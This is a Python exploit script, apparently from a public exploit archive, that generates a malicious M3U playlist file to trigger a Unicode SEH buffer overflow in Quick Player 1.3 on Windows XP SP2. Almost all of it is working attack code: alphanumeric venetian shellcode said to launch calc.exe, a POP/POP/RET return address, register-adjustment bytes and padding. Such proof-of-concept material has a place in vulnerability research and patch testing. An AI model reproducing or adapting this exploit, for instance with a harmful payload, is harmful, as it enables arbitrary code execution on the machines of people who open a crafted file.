#Quick Player 1.3 Unicode SEH Exploit
#Author Abhishek Lyall and Puneet Jain -puneet.jain0000@gmail.com , abhilyall[at]gmail[dot]com, info[at]aslitsecurity[dot]com
#Web - http://www.aslitsecurity.com/
#Blog - http://www.aslitsecurity.blogspot.com/
#Download Vulnerable application from http://download.cnet.com/Quick-Player/3640-2168_4-10871418.html
#Vulnerable version Quick Player 1.3
#Tested on XP SP2
#Greets corelanc0d3r, mr_me, webDEViL, SkyLined and ASL IT SECURITY TEAM
#!/usr/bin/python
 
 
filename = "ASL.m3u"
 
 
# windows\exec calc.exe unicode uppercase shellcode
shellcode=("PPYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAP"
"AZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB3Y9R8Z9L8Y2RJT1N0V0Y0I0I0I0I0"
"I0I0I0I0I0I0C0C0C0C0C0C070Q0Z1Z110X0P001100112K11110Q02110B020B0B000B0B110B0X0P0"
"8110B2U0J0I0I2L0M080N1Y0E0P0G2P0C000Q2P0K090K0U0E1Q0H0R0B0D0L0K0B2R0P000L0K0F020"
"F2L0L0K0C1R0G1T0N2K0Q1R0D1X0D0O0L2W0C2Z0E2V0E1Q0I2O0F0Q0K2P0L2L0E2L0Q2Q0C0L0E0R0"
"D2L0G0P0O010J2O0D0M0G2Q0K2W0I2R0H2P0P0R0C1W0N2K0B2R0B000L0K0P0B0G0L0G2Q0H0P0N2K0"
"C2P0Q1X0K050K2P0P2T0Q0Z0E0Q0H0P0B2P0N2K0C2X0F2X0L0K0B2X0E2P0E0Q0N030I2S0G0L0P0I0"
"N2K0G0D0N2K0F1Q0I0F0P010I2O0E1Q0O000L2L0J1Q0H0O0F2M0C010O070G0H0K0P0B0U0L040E0S0"
"C0M0K0H0E2K0Q2M0Q040P2U0K0R0P0X0N2K0F080G0T0C010I0C0E060N2K0F2L0B2K0N2K0B2X0G2L0"
"C010K1S0N2K0G2T0L0K0C010H0P0L0I0Q0T0D1T0E2T0C2K0C2K0P1Q0B2Y0P0Z0P0Q0I2O0K0P0C1X0"
"C2O0C1Z0N2K0F2R0H2K0L0F0C2M0B0J0E0Q0N2M0N1U0O0I0G2P0C000E0P0B2P0Q2X0P010N2K0P2O0"
"O2W0K0O0J2U0M2K0J0P0N0U0I020F060E080N0F0L0U0O0M0M0M0K0O0I0E0E2L0F1V0Q2L0F1Z0M0P0"
"K0K0M000Q1U0G2U0O0K0P0G0D0S0Q1R0P2O0P1Z0C000Q0C0K0O0J2U0E030C0Q0P2L0E030D2N0B0E0"
"D080Q2U0C000E0Z1111KPA")
 
 
#header
head = "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0A\x46\x69\x6C\x65\x31\x3D"
  
junk =  "\x41" * 530
#popad + nop
junk += "\x61\x62"
#P/P/R unicode compatible 0x004a0041 quick player.exe
junk += "\x41\x4a"
#POP EAX
junk += "\x58"
#Venetian Shellcode
junk += "\x6d"
#ADD EAX 0x11002100
junk += "\x05\x21\x11"
#Venetian Shellcode
junk += "\x6d"
#SUB EAX 0x11002000
junk += "\x2d\x20\x11"
#Venetian Shellcode
junk += "\x6d"
#PUSH EAX
junk += "\x50"
#Venetian Shellcode
junk += "\x6d"
#RETN
junk += "\xc3"
#PADD
junk += "\x41" * 111
junk += shellcode
 
 
 
 
junk2 = "\x44" * (20000-len(junk+shellcode))
 
  
textfile = open(filename , 'w')
textfile.write(head+junk+junk2)
textfile.close()